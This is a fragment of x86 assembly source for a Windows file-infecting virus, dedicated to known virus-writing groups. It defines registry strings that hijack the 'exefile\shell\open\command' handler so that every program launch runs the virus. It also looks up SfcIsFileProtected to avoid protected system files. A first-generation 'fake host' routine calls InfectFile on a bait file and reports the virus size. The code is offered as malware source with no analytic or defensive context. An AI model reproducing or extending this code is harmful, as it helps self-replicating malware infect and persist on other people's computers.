                   		db  'So when you know that your time is close at hand', CRLF
                   		db  'Maybe then you ll begin to understand', CRLF
                   		db  'Life down there is just a strange illusion', CRLF, CRLF
                   		db  'Dedicated to rrlf, BlueOwl, DiA, Philie and all the gang', CRLF, 0

    szUser32       db  'USER32.DLL', 0
    szAdvapi32     db  'ADVAPI32.DLL', 0
    szSfc          db  'SFC.DLL', 0
    szSfcProc      db  "SfcIsFileProtected", 0
    szRegKey       db  "exefile\shell\open\command", 0
    szRegValue     db  SPAWN_NAME, ' ', 1, '"%1" %*', 0
    szSpawnFile    db  '\', SPAWN_NAME, 0
    Padding        dd   ?
ProcessInformation      PROCESS_INFORMATION <>

VirusEnd:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Fake Host Code
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
FakeHost:
	mov		esi, offset szBait
	call 	InfectFile

	sub  	esp, 1024
	mov  	esi, esp

	push 	2
	push 	VIRUS_SIZE
	push 	VIRUS_SIZE
	push 	offset szTemplate
	push 	esi
	call 	_wsprintfA

    push 	1040h
    push 	offset szTitle
    push 	esi
    push 	0
    call 	MessageBoxA

    add     esp, 1024

FakeHost_Quit:
    push 	0
    call 	ExitProcess

End VirusStart
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

  